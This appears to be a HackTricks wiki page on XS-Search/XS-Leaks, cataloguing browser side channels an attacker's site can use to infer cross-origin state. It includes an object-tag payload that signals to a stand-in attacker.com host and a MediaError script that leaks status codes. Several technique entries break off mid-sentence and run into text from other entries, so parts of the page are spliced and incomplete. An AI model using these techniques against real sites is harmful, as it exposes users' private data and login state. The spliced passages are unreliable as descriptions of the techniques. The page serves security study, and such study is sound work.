_body: "# XS-Search/XS-Leaks\n\n{{#include ../banners/hacktricks-training.md}}\n\n## Basic Information\n\nXS-Search is a method\
  \ used for **extracting cross-origin information** by leveraging **side channel vulnerabilities**.\n\nKey components involved\
  \ in this attack include:\n\n- **Vulnerable Web**: The target website from which information is intended to be extracted.\n\
  - **Attacker's Web**: The malicious website created by the attacker, which the victim visits, hosting the exploit.\n- **Inclusion\
  \ Method**: The technique employed to incorporate the Vulnerable Web into the Attacker's Web (e.g., window.open, iframe,\
  \ fetch, HTML tag with href, etc.).\n- **Leak Technique**: Techniques used to discern differences in the state of the Vulnerable\
  \ Web based on information gathered through the inclusion method.\n- **States**: The two potential conditions of the Vulnerable\
  \ Web, which the attacker aims to distinguish.\n- **Detectable Differences**: Observable variations that the attacker relies\
  \ on to infer the state of the Vulnerable Web.\n\n### Detectable Differences\n\nSeveral aspects can be analyzed to differentiate\
  \ the states of the Vulnerable Web:\n\n- **Status Code**: Distinguishing between **various HTTP response status codes**\
  \ cross-origin, like server errors, client errors, or authentication errors.\n- **API Usage**: Identifying **usage of Web\
  \ APIs** across pages, revealing whether a cross-origin page employs a specific JavaScript Web API.\n- **Redirects**: Detecting\
  \ navigations to different pages, not just HTTP redirects but also those triggered by JavaScript or HTML.\n- **Page Content**:\
  \ Observing **variations in the HTTP response body** or in page sub-resources, such as the **number of embedded frames**\
  \ or size disparities in images.\n- **HTTP Header**: Noting the presence or possibly the value of a **specific HTTP response\
  \ header**, including headers like X-Frame-Options, Content-Disposition, and Cross-Origin-Resource-Policy.\n- **Timing**:\
  \ Noticing consistent time disparities between the two states.\n\n### Inclusion Methods\n\n- **HTML Elements**: HTML offers\
  \ various elements for **cross-origin resource inclusion**, like stylesheets, images, or scripts, compelling the browser\
  \ to request a non-HTML resource. A compilation of potential HTML elements for this purpose can be found at [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).\n\
  - **Frames**: Elements such as **iframe**, **object**, and **embed** can embed HTML resources directly into the attacker's\
  \ page. If the page **lacks framing protection**, JavaScript can access the framed resource’s window object via the contentWindow\
  \ property.\n- **Pop-ups**: The **`window.open`** method opens a resource in a new tab or window, providing a **window handle**\
  \ for JavaScript to interact with methods and properties following the SOP. Pop-ups, often used in single sign-on, circumvent\
  \ framing and cookie restrictions of a target resource. However, modern browsers restrict pop-up creation to certain user\
  \ actions.\n- **JavaScript Requests**: JavaScript permits direct requests to target resources using **XMLHttpRequests**\
  \ or the **Fetch API**. These methods offer precise control over the request, like opting to follow HTTP redirects.\n\n\
  ### Leak Techniques\n\n- **Event Handler**: A classical leak technique in XS-Leaks, where event handlers like **onload**\
  \ and **onerror** provide insights about resource loading success or failure.\n- **Error Messages**: JavaScript exceptions\
  \ or special error pages can provide leak information either directly from the error message or by differentiating between\
  \ its presence and absence.\n- **Global Limits**: Physical limitations of a browser, like memory capacity or other enforced\
  \ browser limits, can signal when a threshold is reached, serving as a leak technique.\n- **Global State**: Detectable interactions\
  \ with browsers' **global states** (e.g., the History interface) can be exploited. For instance, the **number of entries**\
  \ in a browser's history can offer clues about cross-origin pages.\n- **Performance API**: This API provides **performance\
  \ details of the current page**, including network timing for the document and loaded resources, enabling inferences about\
  \ requested resources.\n- **Readable Attributes**: Some HTML attributes are **readable cross-origin** and can be used as\
  \ a leak technique. For instance, the `window.frame.length` property allows JavaScript to count the frames included in a\
  \ webpage cross-origin.\n\n## XSinator Tool & Paper\n\nXSinator is an automatic tool to **check browsers against several\
  \ know XS-Leaks** explained in its paper: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)\n\nYou can\
  \ **access the tool in** [**https://xsinator.com/**](https://xsinator.com/)\n\n> [!WARNING]\n> **Excluded XS-Leaks**: We\
  \ had to exclude XS-Leaks that rely on **service workers** as they would interfere with other leaks in XSinator. Furthermore,\
  \ we chose to **exclude XS-Leaks that rely on misconfiguration and bugs in a specific web application**. For example, CrossOrigin\
  \ Resource Sharing (CORS) misconfigurations, postMessage leakage or Cross-Site Scripting. Additionally, we excluded timebased\
  \ XS-Leaks since they often suffer from being slow, noisy and inaccurate.\n\n## **Timing Based techniques**\n\nSome of the\
  \ following techniques are going to use timing to as part of the process to detect differences in the possible states of\
  \ the web pages. There are different ways to measure time in a web browser.\n\n**Clocks**: The [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)\
  \ API allows developers to get high-resolution timing measurements.\\\nThere are a considerable number of APIs attackers\
  \ can abuse to create implicit clocks: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API),\
  \ [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame),\
  \ [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations, and\
  \ others.\\\nFor more info: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).\n\
  \n## Event Handler Techniques\n\n### Onload/Onerror\n\n- **Inclusion Methods**: Frames, HTML Elements\n- **Detectable Difference**:\
  \ Status Code\n- **More info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu),\
  \ [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)\n- **Summary**: if trying\
  \ to load a resource onerror/onload events are triggered with the resource is loaded successfully/unsuccessfully it's possible\
  \ to figure out the status code.\n- **Code example**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)\n\
  \n\n{{#ref}}\nxs-search/cookie-bomb-+-onerror-xs-leak.md\n{{#endref}}\n\nThe code example try lo **load scripts objects\
  \ from JS**, but **other tags** such as objects, stylesheets, images, audios could be also used. Moreover, it's also possible\
  \ to inject the **tag directly** and declare the `onload` and `onerror` events inside the tag (instead of injecting it from\
  \ JS).\n\nThere is also a script-less version of this attack:\n\n```html\n<object data=\"//example.com/404\">\n  <object\
  \ data=\"//attacker.com/?error\"></object>\n</object>\n```\n\nIn this case if `example.com/404` is not found `attacker.com/?error`\
  \ will be loaded.\n\n### Onload Timing\n\n- **Inclusion Methods**: HTML Elements\n- **Detectable Difference**: Timing (generally\
  \ due to Page Content, Status Code)\n- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)\n\
  - **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API**\
  \ can be used to measure how much time it takes to perform a request. However, other clocks could be used, such as [**PerformanceLongTaskTiming\
  \ API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) which can identify tasks running for\
  \ more than 50ms.\n- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)\
  \ another example in:\n\n\n{{#ref}}\nxs-search/performance.now-example.md\n{{#endref}}\n\n#### Onload Timing + Forced Heavy\
  \ Task\n\nThis technique is just like the previous one, but the **attacker** will also **force** some action to take a **relevant\
  \ amount time** when the **answer is positive or negative** and measure that time.\n\n\n{{#ref}}\nxs-search/performance.now-+-force-heavy-task.md\n\
  {{#endref}}\n\n### unload/beforeunload Timing\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**: Timing (generally\
  \ due to Page Content, Status Code)\n- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)\n\
  - **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers)\
  \ can be used to measure how much time it takes to perform a request. Other clocks could be used.\n- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)\n\
  \nThe time taken to fetch a resource can be measured by utilizing the [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event)\
  \ and [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) events. The **`beforeunload`**\
  \ event is fired when the browser is about to navigate to a new page, while the **`unload`** event occurs when the navigation\
  \ is actually taking place. The time difference between these two events can be calculated to determine the **duration the\
  \ browser spent fetching the resource**.\n\n### Sandboxed Frame Timing + onload <a href=\"#sandboxed-frame-timing-attacks\"\
  \ id=\"sandboxed-frame-timing-attacks\"></a>\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**: Timing (generally\
  \ due to Page Content, Status Code)\n- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)\n\
  - **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API can be\
  \ used to measure how much time it takes to perform a request. Other clocks could be used.\n- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)\n\
  \nIt has been observed that in the absence of [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), the\
  \ time required for a page and its subresources to load over the network can be measured by an attacker. This measurement\
  \ is typically possible because the `onload` handler of an iframe is triggered only after the completion of resource loading\
  \ and JavaScript execution. To bypass the variability introduced by script execution, an attacker might employ the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)\
  \ attribute within the `<iframe>`. The inclusion of this attribute restricts numerous functionalities, notably the execution\
  \ of JavaScript, thereby facilitating a measurement that is predominantly influenced by network performance.\n\n```javascript\n\
  // Example of an iframe with the sandbox attribute\n<iframe src=\"example.html\" sandbox></iframe>\n```\n\n### #ID + error\
  \ + onload\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**: Page Content\n- **More info**:\n- **Summary**:\
  \ If you can make the page error when the correct content is accessed and make it load correctly when any content is accessed,\
  \ then you can make a loop to extract all the information without measuring the time.\n- **Code Example**:\n\nSuppose that\
  \ you can **insert** the **page** that has the **secret** content **inside an Iframe**.\n\nYou can **make the victim search**\
  \ for the file that contains \"_**flag**_\" using an **Iframe** (exploiting a CSRF for example). Inside the Iframe you know\
  \ that the _**onload event**_ will be **executed always at least once**. Then, you can **change** the **URL** of the **iframe**\
  \ but changing only the **content** of the **hash** inside the URL.\n\nFor example:\n\n1. **URL1**: www.attacker.com/xssearch#try1\n\
  2. **URL2**: www.attacker.com/xssearch#try2\n\nIf the first URL was **successfully loaded**, then, when **changing** the\
  \ **hash** part of the URL the **onload** event **won't be triggered** again. But **if** the page had some kind of **error**\
  \ when **loading**, then, the **onload** event will be **triggered again**.\n\nThen, you can **distinguish between** a **correctly**\
  \ loaded page or page that has an **error** when is accessed.\n\n### Javascript Execution\n\n- **Inclusion Methods**: Frames\n\
  - **Detectable Difference**: Page Content\n- **More info**:\n- **Summary:** If the **page** is **returning** the **sensitive**\
  \ content, **or** a **content** that can be **controlled** by the user. The user could set **valid JS code in the negative\
  \ case**, an **load** each try inside **`<script>`** tags, so in **negative** cases attackers **code** is **executed,**\
  \ and in **affirmative** cases **nothing** will be executed.\n- **Code Example:**\n\n\n{{#ref}}\nxs-search/javascript-execution-xs-leak.md\n\
  {{#endref}}\n\n### CORB - Onerror\n\n- **Inclusion Methods**: HTML Elements\n- **Detectable Difference**: Status Code &\
  \ Headers\n- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)\n\
  - **Summary**: **Cross-Origin Read Blocking (CORB)** is a security measure that prevents web pages from loading certain\
  \ sensitive cross-origin resources to protect against attacks like **Spectre**. However, attackers can exploit its protective\
  \ behavior. When a response subject to **CORB** returns a _**CORB protected**_ `Content-Type` with `nosniff` and a `2xx`\
  \ status code, **CORB** strips the response's body and headers. Attackers observing this can infer the combination of the\
  \ **status code** (indicating success or error) and the `Content-Type` (denoting whether it's protected by **CORB**), leading\
  \ to potential information leakage.\n- **Code Example:**\n\nCheck the more information link for more information about the\
  \ attack.\n\n### onblur\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**: Page Content\n- **More info**:\
  \ [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)\n\
  - **Summary**: Leak sensitive data from the id or name attribute.\n- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)\n\
  \nIt's possible to **load a page** inside an **iframe** and use the **`#id_value`** to make the page **focus on the element**\
  \ of the iframe with indicated if, then if an **`onblur`** signal is triggered, the ID element exists.\\\nYou can perform\
  \ the same attack with **`portal`** tags.\n\n### postMessage Broadcasts <a href=\"#postmessage-broadcasts\" id=\"postmessage-broadcasts\"\
  ></a>\n\n- **Inclusion Methods**: Frames, Pop-ups\n- **Detectable Difference**: API Usage\n- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)\n\
  - **Summary**: Gather sensitive information from a postMessage or use the presence of postMessages as an oracle to know\
  \ the status of the user in the page\n- **Code Example**: `Any code listening for all postMessages.`\n\nApplications frequently\
  \ utilize [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate\
  \ across different origins. However, this method can inadvertently expose **sensitive information** if the `targetOrigin`\
  \ parameter is not properly specified, allowing any window to receive the messages. Furthermore, the mere act of receiving\
  \ a message can act as an **oracle**; for instance, certain messages might only be sent to users who are logged in. Therefore,\
  \ the presence or absence of these messages can reveal information about the user's state or identity, such as whether they\
  \ are authenticated or not.\n\n## Global Limits Techniques\n\n### WebSocket API\n\n- **Inclusion Methods**: Frames, Pop-ups\n\
  - **Detectable Difference**: API Usage\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
  \ (5.1)\n- **Summary**: Exhausting the WebSocket connection limit leaks the number of WebSocket connections of a cross-origin\
  \ page.\n- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>),\
  \ [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)\n\
  \nIt is possible to identify if, and how many, **WebSocket connections a target page uses**. It allows an attacker to detect\
  \ application states and leak information tied to the number of WebSocket connections.\n\nIf one **origin** uses the **maximum\
  \ amount of WebSocket** connection objects, regardless of their connections state, the creation of **new objects will result\
  \ in JavaScript exceptions**. To execute this attack, the attacker website opens the target website in a pop-up or iframe\
  \ and then, after the target web has been loaded, attempts to create the maximum number of WebSockets connections possible.\
  \ The **number of thrown exceptions** is the **number of WebSocket connections used by the target website** window.\n\n\
  ### Payment API\n\n- **Inclusion Methods**: Frames, Pop-ups\n- **Detectable Difference**: API Usage\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
  \ (5.1)\n- **Summary**: Detect Payment Request because only one can be active at a time.\n- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)\n\
  \nThis XS-Leak enables an attacker to **detect when a cross-origin page initiates a payment request**.\n\nBecause **only\
  \ one request payment can be active** at the same time, if the target website is using the Payment Request API, any f**urther\
  \ attempts to show use this API will fail**, and cause a **JavaScript exception**. The attacker can exploit this by **periodically\
  \ attempting to show the Payment API UI**. If one attempt causes an exception, the target website is currently using it.\
  \ The attacker can hide these periodical attempts by immediately closing the UI after creation.\n\n### Timing the Event\
  \ Loop <a href=\"#timing-the-event-loop\" id=\"timing-the-event-loop\"></a>\n\n- **Inclusion Methods**:\n- **Detectable\
  \ Difference**: Timing (generally due to Page Content, Status Code)\n- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)\n\
  - **Summary:** Measure execution time of a web abusing the single-threaded JS event loop.\n- **Code Example**:\n\n\n{{#ref}}\n\
  xs-search/event-loop-blocking-+-lazy-images.md\n{{#endref}}\n\nJavaScript operates on a [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)\
  \ concurrency model, signifying that **it can only execute one task at a time**. This characteristic can be exploited to\
  \ gauge **how long code from a different origin takes to execute**. An attacker can measure the execution time of their\
  \ own code in the event loop by continuously dispatching events with fixed properties. These events will be processed when\
  \ the event pool is empty. If other origins are also dispatching events to the same pool, an **attacker can infer the time\
  \ it takes for these external events to execute by observing delays in the execution of their own tasks**. This method of\
  \ monitoring the event loop for delays can reveal the execution time of code from different origins, potentially exposing\
  \ sensitive information.\n\n> [!WARNING]\n> In an execution timing it's possible to **eliminate** **network factors** to\
  \ obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.\n\n###\
  \ Busy Event Loop <a href=\"#busy-event-loop\" id=\"busy-event-loop\"></a>\n\n- **Inclusion Methods**:\n- **Detectable Difference**:\
  \ Timing (generally due to Page Content, Status Code)\n- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)\n\
  - **Summary:** One method to measure the execution time of a web operation involves intentionally blocking the event loop\
  \ of a thread and then timing **how long it takes for the event loop to become available again**. By inserting a blocking\
  \ operation (such as a long computation or a synchronous API call) into the event loop, and monitoring the time it takes\
  \ for subsequent code to begin execution, one can infer the duration of the tasks that were executing in the event loop\
  \ during the blocking period. This technique leverages the single-threaded nature of JavaScript's event loop, where tasks\
  \ are executed sequentially, and can provide insights into the performance or behavior of other operations sharing the same\
  \ thread.\n- **Code Example**:\n\nA significant advantage of the technique of measuring execution time by locking the event\
  \ loop is its potential to circumvent **Site Isolation**. **Site Isolation** is a security feature that separates different\
  \ websites into separate processes, aiming to prevent malicious sites from directly accessing sensitive data from other\
  \ sites. However, by influencing the execution timing of another origin through the shared event loop, an attacker can indirectly\
  \ extract information about that origin's activities. This method does not rely on direct access to the other origin's data\
  \ but rather observes the impact of that origin's activities on the shared event loop, thus evading the protective barriers\
  \ established by **Site Isolation**.\n\n> [!WARNING]\n> In an execution timing it's possible to **eliminate** **network\
  \ factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading\
  \ it.\n\n### Connection Pool\n\n- **Inclusion Methods**: JavaScript Requests\n- **Detectable Difference**: Timing (generally\
  \ due to Page Content, Status Code)\n- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)\n\
  - **Summary:** An attacker could lock all the sockets except 1, load the target web and at the same time load another page,\
  \ the time until the last page is starting to load is the time the target page took to load.\n- **Code Example**:\n\n\n\
  {{#ref}}\nxs-search/connection-pool-example.md\n{{#endref}}\n\nBrowsers utilize sockets for server communication, but due\
  \ to the limited resources of the operating system and hardware, **browsers are compelled to impose a limit** on the number\
  \ of concurrent sockets. Attackers can exploit this limitation through the following steps:\n\n1. Ascertain the browser's\
  \ socket limit, for instance, 256 global sockets.\n2. Occupy 255 sockets for an extended duration by initiating 255 requests\
  \ to various hosts, designed to keep the connections open without completing.\n3. Employ the 256th socket to send a request\
  \ to the target page.\n4. Attempt a 257th request to a different host. Given that all sockets are in use (as per steps 2\
  \ and 3), this request will be queued until a socket becomes available. The delay before this request proceeds provides\
  \ the attacker with timing information about the network activity related to the 256th socket (the target page's socket).\
  \ This inference is possible because the 255 sockets from step 2 are still engaged, implying that any newly available socket\
  \ must be the one released from step 3. The time taken for the 256th socket to become available is thus directly linked\
  \ to the time required for the request to the target page to complete.\n\nFor more info: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)\n\
  \n### Connection Pool by Destination\n\n- **Inclusion Methods**: JavaScript Requests\n- **Detectable Difference**: Timing\
  \ (generally due to Page Content, Status Code)\n- **More info**:\n- **Summary:** It's like the previous technique but instead\
  \ of using all the sockets, Google **Chrome** puts a limit of **6 concurrent request to the same origin**. If we **block\
  \ 5** and then **launch a 6th** request we can **time** it and if we managed to make the **victim page send** more **requests**\
  \ to the same endpoint to detect a **status** of the **page**, the **6th request** will take **longer** and we can detect\
  \ it.\n\n## Performance API Techniques\n\nThe [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance)\
  \ offers insights into the performance metrics of web applications, further enriched by the [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API).\
  \ The Resource Timing API enables the monitoring of detailed network request timings, such as the duration of the requests.\
  \ Notably, when servers include the `Timing-Allow-Origin: *` header in their responses, additional data like the transfer\
  \ size and domain lookup time becomes available.\n\nThis wealth of data can be retrieved via methods like [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries)\
  \ or [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), providing\
  \ a comprehensive view of performance-related information. Additionally, the API facilitates the measurement of execution\
  \ times by calculating the difference between timestamps obtained from [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now).\
  \ However, it's worth noting that for certain operations in browsers like Chrome, the precision of `performance.now()` may\
  \ be limited to milliseconds, which could affect the granularity of timing measurements.\n\nBeyond timing measurements,\
  \ the Performance API can be leveraged for security-related insights. For instance, the presence or absence of pages in\
  \ the `performance` object in Chrome can indicate the application of `X-Frame-Options`. Specifically, if a page is blocked\
  \ from rendering in a frame due to `X-Frame-Options`, it will not be recorded in the `performance` object, providing a subtle\
  \ clue about the page's framing policies.\n\n### Error Leak\n\n- **Inclusion Methods**: Frames, HTML Elements\n- **Detectable\
  \ Difference**: Status Code\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)\n-\
  \ **Summary:** A request that results in errors will not create a resource timing entry.\n- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)\n\
  \nIt is possible to **differentiate between HTTP response status codes** because requests that lead to an **error** do **not\
  \ create a performance entry**.\n\n### Style Reload Error\n\n- **Inclusion Methods**: HTML Elements\n- **Detectable Difference**:\
  \ Status Code\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)\n- **Summary:** Due\

  \nIn the previous technique it was also identified two cases where browser bugs in GC lead to **resources being loaded twice\
  \ when they fail to load**. This will result in multiple entries in the Performance API and can thus be detected.\n\n###\
  \ Request Merging Error\n\n- **Inclusion Methods**: HTML Elements\n- **Detectable Difference**: Status Code\n- **More info**:\
  \ [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)\n- **Summary:** Requests that result in an error\

  \nAn attacker can detect if a request resulted in an empty HTTP response body because e**mpty pages do not create a performance\
  \ entry in some browsers**.\n\n### **XSS-Auditor Leak**\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**:\
  \ Page Content\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)\n- **Summary:**\
  \ Using the XSS Auditor in Security Assertions, attackers can detect specific webpage elements by observing alterations\
  \ in responses when crafted payloads trigger the auditor's filtering mechanism.\n- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)\n\
  \nIn Security Assertions (SA), the XSS Auditor, originally intended to prevent Cross-Site Scripting (XSS) attacks, can paradoxically\
  \ be exploited to leak sensitive information. Although this built-in feature was removed from Google Chrome (GC), it's still\
  \ present in SA. In 2013, Braun and Heiderich demonstrated that the XSS Auditor could inadvertently block legitimate scripts,\
  \ leading to false positives. Building on this, researchers developed techniques to extract information and detect specific\
  \ content on cross-origin pages, a concept known as XS-Leaks, initially reported by Terada and elaborated by Heyes in a\
  \ blog post. Although these techniques were specific to the XSS Auditor in GC, it was discovered that in SA, pages blocked\
  \ by the XSS Auditor do not generate entries in the Performance API, revealing a method through which sensitive information\
  \ might still be leaked.\n\n### X-Frame Leak\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**: Header\n-\
  \ **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html),\

  - **Summary:** Resource with X-Frame-Options header does not create resource timing entry.\n- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)\n\
  \nIf a page is **not allowed** to be **rendered** in an **iframe** it does **not create a performance entry**. As a result,\
  \ an attacker can detect the response header **`X-Frame-Options`**.\\\nSame happens if you use an **embed** **tag.**\n\n\
  ### Download Detection\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**: Header\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
  \ (5.2)\n- **Summary:** Downloads do not create resource timing entries in the Performance API.\n- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)\n\
  \nSimilar, to the XS-Leak described, a **resource that is downloaded** because of the ContentDisposition header, also does\
  \ **not create a performance entry**. This technique works in all major browsers.\n\n### Redirect Start Leak\n\n- **Inclusion\
  \ Methods**: Frames\n- **Detectable Difference**: Redirect\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\

  \nWe found one XS-Leak instance that abuses the behavior of some browsers which log too much information for cross-origin\
  \ requests. The standard defines a subset of attributes that should be set to zero for cross-origin resources. However,\
  \ in **SA** it is possible to detect if the user is **redirected** by the target page, by querying the **Performance API**\
  \ and checking for the **redirectStart timing data**.\n\n### Duration Redirect Leak\n\n- **Inclusion Methods**: Fetch API\n\
  - **Detectable Difference**: Redirect\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\

  \nIn GC, the **duration** for requests that result in a **redirect** is **negative** and can thus be **distinguished** from\
  \ requests that do not result in a redirect.\n\n### CORP Leak\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**:\
  \ Header\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)\n- **Summary:** Resource\

  \nIn some cases, the **nextHopProtocol entry** can be used as a leak technique. In GC, when the **CORP header** is set,\
  \ the nextHopProtocol will be **empty**. Note that SA will not create a performance entry at all for CORP-enabled resources.\n\
  \n### Service Worker\n\n- **Inclusion Methods**: Frames\n- **Detectable Difference**: API Usage\n- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)\n\
  - **Summary:** Detect if a service worker is registered for a specific origin.\n- **Code Example**:\n\nService workers are\
  \ event-driven script contexts that run at an origin. They run in the background of a web page and can intercept, modify,\
  \ and **cache resources** to create offline web application.\\\nIf a **resource cached** by a **service worker** is accessed\
  \ via **iframe**, the resource will be **loaded from the service worker cache**.\\\nTo detect if the resource was **loaded\
  \ from the service worker** cache the **Performance API** can be used.\\\nThis could also be done with a Timing attack (check\
  \ the paper for more info).\n\n### Cache\n\n- **Inclusion Methods**: Fetch API\n- **Detectable Difference**: Timing\n- **More\

  - **Summary:** In Firefox is possible to accurately leak a cross-origin request’s status code.\n- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)\n\
  \n```javascript\n// Code saved here in case it dissapear from the link\n// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/\n\
  window.addEventListener(\"load\", startup, false)\nfunction displayErrorMessage(msg) {\n  document.getElementById(\"log\"\
  ).innerHTML += msg\n}\n\nfunction startup() {\n  let audioElement = document.getElementById(\"audio\")\n  // \"https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3\"\
  ;\n  document.getElementById(\"startTest\").addEventListener(\n    \"click\",\n    function () {\n      audioElement.src\
  \ = document.getElementById(\"testUrl\").value\n    },\n    false\n  )\n  // Create the event handler\n  var errHandler\
  \ = function () {\n    let err = this.error\n    let message = err.message\n    let status = \"\"\n\n    // Chrome error.message\
  \ when the request loads successfully: \"DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed\"\n    // Firefox\
  \ error.message when the request loads successfully: \"Failed to init decoder\"\n    if (\n      message.indexOf(\"DEMUXER_ERROR_COULD_NOT_OPEN\"\
  ) != -1 ||\n      message.indexOf(\"Failed to init decoder\") != -1\n    ) {\n      status = \"Success\"\n    } else {\n\
  \      status = \"Error\"\n    }\n    displayErrorMessage(\n      \"<strong>Status: \" +\n        status +\n        \"</strong>\
  \ (Error code:\" +\n        err.code +\n        \" / Error Message: \" +\n        err.message +\n        \")<br>\"\n   \
  \ )\n  }\n  audioElement.onerror = errHandler\n}\n```\n\nThe `MediaError` interface's message property uniquely identifies\
  \ resources that load successfully with a distinct string. An attacker can exploit this feature by observing the message\
